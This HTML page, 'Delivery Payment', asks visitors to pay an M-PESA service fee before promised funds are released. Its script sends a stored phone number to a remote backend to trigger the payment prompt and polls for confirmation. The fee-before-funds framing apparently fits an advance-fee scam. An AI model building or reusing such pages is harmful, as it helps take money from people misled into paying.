<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Delivery Payment</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    background:#eef4f8;
    font-family:'Mali',cursive;
    color:#16445b;
}

.container{
    width:100%;
    max-width:680px;
    margin:auto;
    padding:20px;
}

.card{
    background:#fff;
    border-radius:20px;
    padding:30px 20px 40px;
    box-shadow:0 8px 25px rgba(0,0,0,.05);
}

h1{
    text-align:center;
    font-size:25px;
    margin-bottom:15px;
}

.message{
    text-align:center;
    color:#666;
    font-family:Arial,sans-serif;
    font-size:16px;
    line-height:1.6;
    margin-bottom:25px;
}

.options{
    display:flex;
    flex-direction:column;
    gap:15px;
}

.option{
    display:flex;
    align-items:center;
    width:100%;
    min-height:75px;
    padding:15px 20px;
    border:1.5px solid #d2d2d2;
    border-radius:15px;
    cursor:pointer;
    font-size:18px;
}

.option input{
    margin-right:12px;
}

.option:hover{
    border-color:#145b82;
}

.fee-box{
    margin:25px 0;
    padding:16px;
    background:#f4f9fc;
    border-radius:12px;
    text-align:center;
    font-size:18px;
}

button{
    width:100%;
    height:65px;
    border:0;
    border-radius:14px;
    background:#125d83;
    color:#fff;
    font-family:'Mali',cursive;
    font-size:20px;
    font-weight:600;
    cursor:pointer;
}

button:disabled{
    opacity:.6;
    cursor:not-allowed;
}

#status{
    margin-top:18px;
    text-align:center;
    font-family:Arial,sans-serif;
    font-size:15px;
    line-height:1.5;
}

footer{
    text-align:center;
    padding:20px 5px;
    color:#777;
    font-family:Arial,sans-serif;
    font-size:12px;
    line-height:1.6;
}
</style>
</head>

<body>

<div class="container">

    <div class="card">

        <h1>Delivery Payment</h1>

        <p class="message">
            Kindly choose where you would like your funds transferred.
            Each delivery method has a small fee to cover applicable
            network and processing charges.
        </p>

        <div class="options">

            <label class="option">
                <input
                    type="radio"
                    name="delivery"
                    value="2"
                    onchange="updateFee()"
                >
                Mobile Money — KSh 2
            </label>

            <label class="option">
                <input
                    type="radio"
                    name="delivery"
                    value="550"
                    onchange="updateFee()"
                >
                Bank Account — KSh 550
            </label>

        </div>

        <div class="fee-box">
            Service Fee:
            <strong>KSh <span id="deliveryFee">--</span></strong>
        </div>

        <button
            id="payButton"
            type="button"
            onclick="payDelivery()"
        >
            Pay Service Fee
        </button>

        <div id="status"></div>

    </div>

    <footer>
        Please review the selected method and applicable fee before
        confirming payment.
    </footer>

</div>

<script>

function updateFee(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(selected){

        document.getElementById("deliveryFee").innerText =
            selected.value;

    }
}


async function payDelivery(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(!selected){

        alert("Please select a delivery method.");

        return;
    }

    const phone =
        localStorage.getItem("phoneNumber");

    if(!phone){

        alert("Phone number not found.");

        return;
    }

    const amount =
        Number(selected.value);

    const status =
        document.getElementById("status");

    const button =
        document.getElementById("payButton");

    button.disabled = true;
    button.innerText = "Processing...";

    status.innerText =
        "Sending payment request...";

    try{

        const response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        phone:phone,
                        amount:amount
                    })
                }
            );

        const data =
            await response.json();

        console.log("STK RESPONSE:",data);

        if(!response.ok){

            throw new Error(
                data.message ||
                "Payment request failed"
            );

        }

        const transactionId =
            data.transactionId ||
            data.checkout_request_id ||
            data.data?.transactionId ||
            data.data?.checkout_request_id;

        if(!transactionId){

            throw new Error(
                "Payment reference was not returned."
            );

        }

        status.innerText =
            "STK Push sent. Please enter your M-PESA PIN.";

        checkPayment(transactionId);

    }catch(error){

        console.error("STK ERROR:",error);

        button.disabled = false;
        button.innerText = "Pay Service Fee";

        status.innerText =
            "Failed to send payment request.";

    }
}


function checkPayment(transactionId){

    const interval =
        setInterval(async()=>{

            try{

                const response =
                    await fetch(
                        "https://nyota-funds-backend.onrender.com/payment-status",
                        {
                            method:"POST",

                            headers:{
                                "Content-Type":"application/json"
                            },

                            body:JSON.stringify({

                                checkout_request_id:
                                    transactionId,

                                transactionId:
                                    transactionId,

                                transaction_id:
                                    transactionId

                            })
                        }
                    );

                const result =
                    await response.json();

                console.log(
                    "PAYMENT STATUS:",
                    result
                );

                const paymentStatus =
                    String(
                        result.status ||
                        result.data?.status ||
                        result.data?.data?.status ||
                        ""
                    ).toLowerCase();

                if(
                    paymentStatus === "completed" ||
                    paymentStatus === "success"
                ){

                    clearInterval(interval);

                    document.getElementById("status").innerText =
                        "Payment confirmed successfully.";

                    setTimeout(()=>{

                        window.location.href =
                            "commitment.html";

                    },1000);

                }

                else if(
                    paymentStatus === "cancelled" ||
                    paymentStatus === "failed"
                ){

                    clearInterval(interval);

                    document.getElementById("status").innerText =
                        "Payment was not completed.";

                    const button =
                        document.getElementById("payButton");

                    button.disabled = false;
                    button.innerText =
                        "Pay Service Fee";

                }

                else{

                    document.getElementById("status").innerText =
                        "Confirming payment...";

                }

            }catch(error){

                console.error(
                    "STATUS ERROR:",
                    error
                );

            }

        },3000);

}

</script>

</body>
</html>
